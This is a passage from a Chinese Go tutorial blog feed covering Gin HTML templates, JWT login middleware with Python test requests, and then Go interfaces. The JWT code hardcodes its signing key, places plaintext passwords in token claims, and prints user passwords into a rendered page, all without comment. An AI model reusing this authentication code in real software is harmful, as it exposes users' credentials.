class="punctuation">:</span><span class="string">&quot;1234567&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="HTML-渲染"><a href="#HTML-渲染" class="headerlink" title="HTML 渲染"></a>HTML 渲染</h2><ul>
<li>gin 支持使用<code> LoadHTMLGlob()</code> 或者 <code>LoadHTMLFiles()</code> 对html进行渲染</li>
</ul>
<h3 id="用户列表"><a href="#用户列表" class="headerlink" title="用户列表"></a>用户列表</h3><ul>
<li>新建一个目录和文件：<code>template\user\list.tmpl</code>代码如下</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>列表数据：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 定义一个 结构体切片 --&gt;</span></span><br><span class="line">            &#123;&#123; $userList := . &#125;&#125;</span><br><span class="line"></span><br><span class="line">            &#123;&#123; range $index,$v := $userList.users &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; $index &#125;&#125;--&#123;&#123; $v.Name &#125;&#125;--&#123;&#123; $v.Password &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            &#123;&#123; end &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>初始化路由器代码那里需要修改，新增加入加载 HTML 模板文件</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// routers/router.go</span></span><br><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/myGin/apis&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span></span> *gin.Engine &#123;</span><br><span class="line"></span><br><span class="line">	router := gin.Default()</span><br><span class="line"></span><br><span class="line">	router.POST(<span class="string">&quot;/login&quot;</span>, apis.UserLogin)</span><br><span class="line">	<span class="comment">// 加载 HTML 模板文件</span></span><br><span class="line">	router.LoadHTMLGlob(<span class="string">&quot;template/user/*&quot;</span>)</span><br><span class="line">	router.GET(<span class="string">&quot;/GetUserList&quot;</span>, apis.GetUserList)</span><br><span class="line">	<span class="keyword">return</span> router</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>apis.GetUserList</code> 中，返回的数据修改为采用html</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// apis/user.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户列表</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetUserList</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	users, err := user.UserList()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;get user list error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// c.JSON(http.StatusOK, gin.H&#123;</span></span><br><span class="line">	<span class="comment">// 	&quot;msg&quot;: users,</span></span><br><span class="line">	<span class="comment">// &#125;)</span></span><br><span class="line">	c.HTML(http.StatusOK, <span class="string">&quot;list.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;users&quot;</span>: users,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行服务器端</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGin&gt; go run .\main.go</span><br></pre></td></tr></table></figure>

<ul>
<li>打开浏览器，查看到结果</li>
</ul>
<p><img src="/aposts/953abffc/image-20230626103441913.png" alt="image-20230626103441913"></p>
<h2 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h2><ul>
<li><p>通过上面的实例，缺少一个登录验证的流程，一个典型的验证流程为：登录成功–生成token–获取用户列表（检查token存在，则获取成功，否则获取失败）</p>
</li>
<li><p>中间件中<code>middleware\jwt\jwt.go</code> 对登录后的token进行处理和验证</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/golang-jwt/jwt/v5&quot;</span> <span class="comment">// go get -u github.com/golang-jwt/jwt/v5</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JWTAuth 中间件，检查token</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">JWTAuth</span><span class="params">()</span></span> gin.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		<span class="comment">// //获取到请求头中的token</span></span><br><span class="line">		token := c.Request.Header.Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;status&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:    <span class="string">&quot;请求未携带token无权限访问&quot;</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">			c.Abort()</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		log.Print(<span class="string">&quot;get token: &quot;</span>, token)</span><br><span class="line"></span><br><span class="line">		j := NewJWT()</span><br><span class="line">		<span class="comment">// parseToken 解析token包含的信息</span></span><br><span class="line">		claims, err := j.ParseToken(token)</span><br><span class="line">		fmt.Println(<span class="string">&quot;claims&quot;</span>, claims)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err == TokenExpired &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;status&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">					<span class="string">&quot;msg&quot;</span>:    <span class="string">&quot;授权已过期&quot;</span>,</span><br><span class="line">				&#125;)</span><br><span class="line">				c.Abort()</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;status&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:    err.Error(),</span><br><span class="line">			&#125;)</span><br><span class="line">			c.Abort()</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 继续交由下一个路由处理,并将解析出的信息传递下去</span></span><br><span class="line">		c.Set(<span class="string">&quot;claims&quot;</span>, claims)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JWT 签名结构</span></span><br><span class="line"><span class="keyword">type</span> JWT <span class="keyword">struct</span> &#123;</span><br><span class="line">	SigningKey []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一些常量</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	TokenExpired     <span class="type">error</span>  = errors.New(<span class="string">&quot;Token is expired&quot;</span>)</span><br><span class="line">	TokenNotValidYet <span class="type">error</span>  = errors.New(<span class="string">&quot;Token not active yet&quot;</span>)</span><br><span class="line">	TokenMalformed   <span class="type">error</span>  = errors.New(<span class="string">&quot;That&#x27;s not even a token&quot;</span>)</span><br><span class="line">	TokenInvalid     <span class="type">error</span>  = errors.New(<span class="string">&quot;Couldn&#x27;t handle this token:&quot;</span>)</span><br><span class="line">	SignKey          <span class="type">string</span> = <span class="string">&quot;newtrekWang&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 载荷，可以加一些自己需要的信息</span></span><br><span class="line"><span class="keyword">type</span> CustomClaims <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID       <span class="type">int</span>    <span class="string">`json:&quot;userId&quot;`</span></span><br><span class="line">	Name     <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">	jwt.RegisteredClaims <span class="comment">// 设置过期时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建一个jwt实例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewJWT</span><span class="params">()</span></span> *JWT &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;JWT&#123;</span><br><span class="line">		[]<span class="type">byte</span>(GetSignKey()),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取signKey</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetSignKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> SignKey</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是SignKey</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetSignKey</span><span class="params">(key <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	SignKey = key</span><br><span class="line">	<span class="keyword">return</span> SignKey</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CreateToken 生成一个token</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(j *JWT)</span></span> CreateToken(claims CustomClaims) (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">	<span class="keyword">return</span> token.SignedString(j.SigningKey)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析Tokne</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(j *JWT)</span></span> ParseToken(tokenString <span class="type">string</span>) (*CustomClaims, <span class="type">error</span>) &#123;</span><br><span class="line">	token, err := jwt.ParseWithClaims(tokenString, &amp;CustomClaims&#123;&#125;, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> j.SigningKey, <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> claims, ok := token.Claims.(*CustomClaims); ok &amp;&amp; token.Valid &#123;</span><br><span class="line">		<span class="keyword">return</span> claims, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, TokenInvalid</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新token</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(j *JWT)</span></span> RefreshToken(tokenString <span class="type">string</span>) (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	token, err := jwt.ParseWithClaims(tokenString, &amp;CustomClaims&#123;&#125;, <span class="function"><span class="keyword">func</span><span class="params">(token *jwt.Token)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> j.SigningKey, <span class="literal">nil</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> claims, ok := token.Claims.(*CustomClaims); ok &amp;&amp; token.Valid &#123;</span><br><span class="line">		claims.RegisteredClaims.ExpiresAt = jwt.NewNumericDate(time.Now().Add(time.Hour * <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> j.CreateToken(*claims)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, TokenInvalid</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>apis/user.go</code> 加入生成token代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	...</span><br><span class="line">	<span class="string">&quot;example.com/myGin/middleware/jwt&quot;</span> <span class="comment">// 引用中间件</span></span><br><span class="line">	<span class="string">&quot;example.com/myGin/models&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="comment">// 引用jwt-v5</span></span><br><span class="line">	jwtgo <span class="string">&quot;github.com/golang-jwt/jwt/v5&quot;</span> <span class="comment">// go get -u github.com/golang-jwt/jwt/v5 </span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成token</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GengerateToken</span><span class="params">(c *gin.Context, user models.User)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 调用中间件的初始化秘钥</span></span><br><span class="line">	j := &amp;jwt.JWT&#123; </span><br><span class="line">		[]<span class="type">byte</span>(<span class="string">&quot;newtrekWang&quot;</span>), <span class="comment">// 秘钥</span></span><br><span class="line">	&#125;</span><br><span class="line">	claims := jwt.CustomClaims&#123;</span><br><span class="line">		user.Id,</span><br><span class="line">		user.Name,</span><br><span class="line">		user.Password,</span><br><span class="line">		jwtgo.RegisteredClaims&#123;</span><br><span class="line">			ExpiresAt: jwtgo.NewNumericDate(time.Now().Add(time.Hour * <span class="number">24</span>)), <span class="comment">//定义过期时间为24小时</span></span><br><span class="line">			Issuer:    <span class="string">&quot;newtrekWang&quot;</span>,                                        <span class="comment">//签名的发行者</span></span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token, err := j.CreateToken(claims)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;status&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			<span class="string">&quot;msg&quot;</span>:    err.Error(),</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	log.Println(token)</span><br><span class="line">	<span class="comment">// 登录成功后的结构体数据</span></span><br><span class="line">	data := LoginResult&#123;</span><br><span class="line">		User:  user,</span><br><span class="line">		Token: token,</span><br><span class="line">	&#125;</span><br><span class="line">	c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;status&quot;</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>:    <span class="string">&quot;登录成功！&quot;</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>:   data,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>routers\router.go</code> 对请求进行验证</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/myGin/apis&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/myGin/middleware/jwt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span></span> *gin.Engine &#123;</span><br><span class="line"></span><br><span class="line">	router := gin.Default()</span><br><span class="line">	<span class="comment">// 这样使用，并不能进行token验证</span></span><br><span class="line">	<span class="comment">// v1 := router.Group(&quot;/v1&quot;)</span></span><br><span class="line">	<span class="comment">// v1.Use(jwt.JWTAuth())</span></span><br><span class="line">	router.POST(<span class="string">&quot;/login&quot;</span>, apis.UserLogin)</span><br><span class="line">	<span class="comment">// 加载 HTML 模板文件</span></span><br><span class="line">	router.LoadHTMLGlob(<span class="string">&quot;template/user/*&quot;</span>)</span><br><span class="line">	<span class="comment">// 对接口进行token验证</span></span><br><span class="line">	router.GET(<span class="string">&quot;/GetUserList&quot;</span>, jwt.JWTAuth(), apis.GetUserList)</span><br><span class="line">	<span class="keyword">return</span> router</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>运行服务器端</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGin&gt; <span class="keyword">go</span> run .\main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<h3 id="客户端发起请求"><a href="#客户端发起请求" class="headerlink" title="客户端发起请求"></a>客户端发起请求</h3><ul>
<li>采用python，不带token值，报错</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">resp2 = requests.get(<span class="string">&quot;http://127.0.0.1:8000/GetUserList&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;请求未携带token无权限访问&quot;</span>,<span class="string">&quot;status&quot;</span>:-<span class="number">1</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>登录后，读取token，填入token发送请求</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test1&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/login&quot;</span>, data=data)</span><br><span class="line">dic = json.loads(resp.text)</span><br><span class="line">token = dic[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;Token&quot;</span>]</span><br><span class="line">header = &#123;<span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line"></span><br><span class="line">resp2 = requests.get(<span class="string">&quot;http://127.0.0.1:8000/GetUserList&quot;</span>, headers=header)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br><span class="line">  &lt;p&gt;列表数据：&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;<span class="number">0</span>--test1--<span class="number">123456</span>&lt;/p&gt;    </span><br><span class="line">   &lt;p&gt;<span class="number">1</span>--test11--<span class="number">1234567</span>&lt;/p&gt;  </span><br></pre></td></tr></table></figure>

<ul>
<li>直接传送正确的token，获取数据正常</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">token = <span class="string">&quot;yJhbGciOiJIUzI1Ni......&quot;</span></span><br><span class="line">header = &#123;<span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line"></span><br><span class="line">resp2 = requests.get(<span class="string">&quot;http://127.0.0.1:8000/GetUserList&quot;</span>, headers=header)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br><span class="line">&lt;p&gt;列表数据：&lt;/p&gt;</span><br><span class="line">&lt;p&gt;<span class="number">0</span>--test1--<span class="number">123456</span>&lt;/p&gt;    </span><br><span class="line">&lt;p&gt;<span class="number">1</span>--test11--<span class="number">1234567</span>&lt;/p&gt;  </span><br></pre></td></tr></table></figure>



<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>代码来自<a href="https://www.cnblogs.com/wangkun122/articles/11044328.html">gin框架实例</a>,其中jwt的验证这里，我用的v5版本，博主用的v4，</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>gin</tag>
      </tags>
  </entry>
  <entry>
    <title>go interface</title>
    <url>/aposts/7993dab5/</url>
    <content><![CDATA[<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><ul>
<li>在Go语言中接口（interface）是一种类型，一种抽象的类型。</li>
<li>interface(接口)是golang最重要的特性之一，实现多态。Interface类型可以定义<strong>一组方法</strong>，但是这些不需要实现。并且interface<strong>不能包含任何变量</strong>。</li>
<li>本篇主要来源<a href="https://www.topgoer.com/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/%E6%8E%A5%E5%8F%A3.html">这里</a></li>
</ul>
<h2 id="接口定义和实现"><a href="#接口定义和实现" class="headerlink" title="接口定义和实现"></a>接口定义和实现</h2><h3 id="接口定义"><a href="#接口定义" class="headerlink" title="接口定义"></a>接口定义</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello_work\iinterface\studyInterface.go</span></span><br><span class="line">/ 定义一个动物接口，接口中有个方法名称，但是不具体实现</span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">	Say()</span><br><span class="line">	GetName() <span class="type">string</span> <span class="comment">//返回内容为string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h3><ul>
<li>一个对象只要全部实现了接口中的方法，那么就实现了这个接口。换句话说，接口就是一个需要实现的方法列表。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应实现了接口中的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> Say() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;汪汪汪&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对应实现了接口中的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> d.Name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> Say() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;喵喵喵&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> c.Name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">\\ hello_work/iinterface/studyInterface.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> iinterface</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个动物接口，接口中有个方法</span></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">	Say()</span><br><span class="line">	GetName() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如下开始，为实现接口中的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应实现了接口中的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> Say() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;汪汪汪&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> d.Name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> Say() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;喵喵喵&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> c.Name</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="接口类型变量"><a href="#接口类型变量" class="headerlink" title="接口类型变量"></a>接口类型变量</h2><ul>
<li>接口类型变量能够存储所有实现了该接口的实例</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello_work\main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/iinterface&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 声明一个Animal类型的变量animal</span></span><br><span class="line">	<span class="keyword">var</span> animal iinterface.Animal</span><br><span class="line">	<span class="comment">// 实例化一个dog结构体</span></span><br><span class="line">	dog := iinterface.Dog&#123;Name: <span class="string">&quot;旺财&quot;</span>&#125;</span><br><span class="line">	<span class="comment">// 可以把dog实例直接赋值给变量animal</span></span><br><span class="line">	animal = dog</span><br><span class="line">	dogName := animal.GetName()</span><br><span class="line">	fmt.Println(dogName)</span><br><span class="line">	animal.Say()</span><br><span class="line"></span><br><span class="line">	cat := iinterface.Cat&#123;Name: <span class="string">&quot;工程喵&quot;</span>&#125;</span><br><span class="line">	animal = cat</span><br><span class="line">	catName := animal.GetName()</span><br><span class="line">	fmt.Println(catName)</span><br><span class="line">	animal.Say()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行结果</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork&gt; <span class="keyword">go</span> run .\hello_work\main.<span class="keyword">go</span></span><br><span class="line">旺财</span><br><span class="line">汪汪汪</span><br><span class="line">工程喵</span><br><span class="line">喵喵喵</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意，如果实现了接口中的方法(studyInterface.go)用的是指针，如func (d *Dog)，那么对应实例化时也要传入指针,dog :&#x3D; &amp;iinterface.Dog{Name: “旺财”}</p>
</blockquote>
<h2 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h2><ul>
<li><p>空接口是指没有定义任何方法的接口。因此任何类型都实现了空接口。</p>
</li>
<li><p>空接口类型的变量可以存储任意类型的变量。</p>
</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li>可以作为字符串，数字，bool类型等</li>
</ul>
